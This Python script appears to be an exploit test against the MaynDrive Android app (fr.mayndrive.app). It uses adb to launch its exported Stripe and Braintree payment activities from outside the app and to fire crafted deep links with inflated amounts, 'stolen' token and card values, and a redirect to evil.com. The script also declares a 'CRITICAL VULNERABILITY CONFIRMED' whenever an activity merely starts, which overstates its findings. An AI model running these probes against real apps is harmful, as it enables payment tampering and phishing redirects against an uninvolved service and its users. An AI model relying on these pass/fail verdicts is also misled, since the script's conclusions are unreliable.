#!/usr/bin/env python3
"""
Simple Payment Exploit Test
==========================

Direct test of payment surface vulnerabilities using ADB commands
"""

import subprocess
import time

def test_payment_activity_exploit():
    """Test if payment activities can be launched externally"""
    print("🚨 Testing Payment Activity Exploits")
    print("=" * 50)
    
    target_package = "fr.mayndrive.app"
    vulnerable_activities = [
        "com.braintreepayments.api.DropInActivity",
        "com.stripe.android.link.LinkRedirectHandlerActivity", 
        "com.stripe.android.payments.StripeBrowserProxyReturnActivity",
        "com.braintreepayments.api.BraintreeDeepLinkActivity",
        "com.stripe.android.financialconnections.lite.FinancialConnectionsSheetLiteRedirectActivity"
    ]
    
    results = []
    
    for activity in vulnerable_activities:
        print(f"\n🎯 Testing: {activity}")
        
        # Test 1: Direct activity launch
        cmd1 = [
            'adb', 'shell', 'am', 'start',
            '-n', f"{target_package}/{activity}"
        ]
        
        print(f"Command: {' '.join(cmd1)}")
        result1 = subprocess.run(cmd1, capture_output=True, text=True, timeout=5)
        
        if result1.returncode == 0:
            print("🚨 VULNERABLE: Activity launched directly!")
            results.append({"activity": activity, "test": "direct_launch", "vulnerable": True})
        else:
            print(f"✅ BLOCKED: {result1.stderr.strip()}")
            results.append({"activity": activity, "test": "direct_launch", "vulnerable": False})
        
        time.sleep(1)
        
        # Test 2: Intent with malicious data
        if "braintree" in activity.lower():
            malicious_data = "braintree://payment?amount=999999&currency=USD"
        elif "stripe" in activity.lower():
            malicious_data = "stripe://malicious-redirect?token=stolen"
        else:
            malicious_data = "mayndriveappddds://payment?amount=999999"
        
        cmd2 = [
            'adb', 'shell', 'am', 'start',
            '-a', 'android.intent.action.VIEW',
            '-d', malicious_data,
            '-n', f"{target_package}/{activity}"
        ]
        
        print(f"Command: {' '.join(cmd2)}")
        result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=5)
        
        if result2.returncode == 0:
            print("🚨 VULNERABLE: Malicious intent accepted!")
            results.append({"activity": activity, "test": "malicious_intent", "vulnerable": True})
        else:
            print(f"✅ BLOCKED: {result2.stderr.strip()}")
            results.append({"activity": activity, "test": "malicious_intent", "vulnerable": False})
        
        time.sleep(1)
    
    # Summary
    vulnerable_count = sum(1 for r in results if r.get("vulnerable", False))
    total_tests = len(results)
    
    print(f"\n📊 SUMMARY:")
    print(f"Total tests: {total_tests}")
    print(f"Vulnerable: {vulnerable_count}")
    print(f"Blocked: {total_tests - vulnerable_count}")
    
    if vulnerable_count > 0:
        print(f"\n🚨 VULNERABILITY CONFIRMED: {vulnerable_count} exploits successful!")
        print("Payment surfaces are NOT properly protected!")
    else:
        print(f"\n✅ NO VULNERABILITY: All exploits blocked")
        print("Payment surfaces appear to be protected")
    
    return results

def test_deep_link_exploits():
    """Test deep-link based exploits"""
    print("\n🔗 Testing Deep-Link Exploits")
    print("=" * 50)
    
    deep_link_tests = [
        {
            "name": "Stripe Deep-Link",
            "data": "stripe://malicious-redirect?token=stolen_token&amount=999999"
        },
        {
            "name": "Braintree Deep-Link", 
            "data": "braintree://payment?amount=999999&card=stolen_card"
        },
        {
            "name": "MaynDrive Deep-Link",
            "data": "mayndriveappddds://payment?amount=999999&redirect_to=https://evil.com"
        }
    ]
    
    results = []
    
    for test in deep_link_tests:
        print(f"\n🎯 Testing: {test['name']}")
        
        cmd = [
            'adb', 'shell', 'am', 'start',
            '-a', 'android.intent.action.VIEW',
            '-d', test['data']
        ]
        
        print(f"Command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        
        if result.returncode == 0:
            print("🚨 VULNERABLE: Deep-link hijacked!")
            results.append({"test": test['name'], "vulnerable": True})
        else:
            print(f"✅ BLOCKED: {result.stderr.strip()}")
            results.append({"test": test['name'], "vulnerable": False})
        
        time.sleep(1)
    
    vulnerable_count = sum(1 for r in results if r.get("vulnerable", False))
    
    print(f"\n📊 Deep-Link Summary:")
    print(f"Vulnerable: {vulnerable_count}/{len(results)}")
    
    return results

def main():
    """Main test function"""
    print("🚨 Simple Payment Exploit Test")
    print("Testing MaynDrive payment surface vulnerabilities")
    print("=" * 60)
    
    # Check if app is installed
    result = subprocess.run([
        'adb', 'shell', 'pm', 'list', 'packages', 'fr.mayndrive.app'
    ], capture_output=True, text=True)
    
    if 'fr.mayndrive.app' not in result.stdout:
        print("❌ MaynDrive app not installed")
        return 1
    
    print("✅ MaynDrive app found")
    
    # Run tests
    activity_results = test_payment_activity_exploit()
    deep_link_results = test_deep_link_exploits()
    
    # Final summary
    total_vulnerable = sum(1 for r in activity_results if r.get("vulnerable", False))
    total_vulnerable += sum(1 for r in deep_link_results if r.get("vulnerable", False))
    
    print(f"\n🎯 FINAL RESULT:")
    if total_vulnerable > 0:
        print(f"🚨 CRITICAL VULNERABILITY CONFIRMED!")
        print(f"Payment surfaces are NOT properly protected!")
        print(f"Total successful exploits: {total_vulnerable}")
    else:
        print(f"✅ NO VULNERABILITY FOUND")
        print(f"Payment surfaces appear to be protected")
    
    return 0 if total_vulnerable == 0 else 1

if __name__ == "__main__":
    import sys
    sys.exit(main())
